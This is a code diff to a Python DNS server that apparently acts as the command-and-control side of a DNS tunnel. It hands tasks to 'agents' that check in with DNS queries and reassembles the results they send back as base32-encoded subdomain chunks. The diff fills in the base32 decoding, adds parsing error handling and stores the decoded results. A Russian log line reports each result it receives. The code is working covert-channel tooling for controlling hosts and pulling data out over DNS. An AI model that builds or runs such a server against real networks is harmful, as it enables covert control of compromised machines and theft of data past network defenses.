@@ -1,11 +1,22 @@
 import socket
 import struct
+import base64
+import binascii
 
 HOST = ('192.168.56.1', 53) #server address
 
 def decode_base32(data :str) -> str:
-    pass
-    return ""
+    data = data.upper()
+
+    missing_padding = len(data) % 8
+    if missing_padding != 0:
+        data += '=' * (8 - missing_padding)
+    
+    try:
+        decoded_bytes = base64.b32decode(data)
+        return decoded_bytes.decode('utf-8')
+    except(binascii.Error, UnicodeDecodeError):
+        return ""
 
 def send_answer(ans, address, agent_id, data, idx, s):
     #FORMING DNS_PACKET_ANSWER
@@ -42,19 +53,27 @@ def run_dns(stop_event, task_manager):
         while not stop_event.is_set():
             data, address = s.recvfrom(1024)
 
-            #parse dns_packet
-            agent_id = data[:2] #ID from agent
-            idx = 12
-            labels = []
-            while True:
-                length = data[idx]
-                if length == 0:
-                    break
-                labels.append(data[(idx + 1):(idx + length + 1)].decode('utf-8'))
-                idx += (length + 1)
-            domain = '.'.join(labels) #domain from agent
-            
+            try:
+                #parse dns_packet
+                agent_id = data[:2] #ID from agent
+                idx = 12
+                labels = []
+                while True:
+                    length = data[idx]
+                    if length == 0:
+                        break
+                    labels.append(data[(idx + 1):(idx + length + 1)].decode('utf-8'))
+                    idx += (length + 1)
+                domain = '.'.join(labels) #domain from agent
+            except Exception:
+                continue
+
             parts = domain.split('.') #parts for domain
+            if parts and parts[-1] == "":
+                parts.pop()
+            if not parts:
+                continue
+
             if parts[0] == "home":
                 connection = task_manager.get_connection()
 
@@ -84,10 +103,10 @@ def run_dns(stop_event, task_manager):
                     result_base32_tmp = [result_tmp[task_id][i] for i in sorted(result_tmp[task_id].keys())]
                     result_base32 = "".join(result_base32_tmp)
                     del result_tmp[task_id]
-                    #result = decode_base32(result_base32) 
+                    result = decode_base32(result_base32) 
                     connection = task_manager.get_connection()
                     try:
-                        task_manager.complete_task(connection, task_id, result_base32)
+                        task_manager.complete_task(connection, task_id, result)
                         print(f"[+/DNS] Получен результат по задаче ({task_id}).")
                     finally:
                         connection.close()
